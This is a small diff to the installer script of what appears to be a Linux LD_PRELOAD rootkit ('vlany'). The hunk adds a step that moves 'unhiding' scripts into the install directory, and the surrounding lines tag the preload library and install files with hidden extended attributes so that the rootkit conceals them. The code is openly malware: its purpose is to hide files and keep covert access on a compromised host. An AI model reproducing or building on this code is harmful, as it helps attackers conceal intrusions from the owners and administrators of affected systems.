@@ -306,6 +306,9 @@ setup_vlany ()
     cp misc/enter_lxc.c $INSTALL/enter_lxc.c
     cp misc/ssh.sh $INSTALL/ssh.sh
 
+    # new scripts for unhiding purposes
+    mv misc/scripts/ $INSTALL/
+
     # protect files and directories
     setfattr -n user.${HIDDEN_XATTR_1_STR} -v ${HIDDEN_XATTR_2_STR} $NEW_PRELOAD
     setfattr -n user.${HIDDEN_XATTR_1_STR} -v ${HIDDEN_XATTR_2_STR} $INSTALL $INSTALL/* $INSTALL/.profile $INSTALL/.bashrc $INSTALL/.shell_msg $INSTALL/.vlany_information
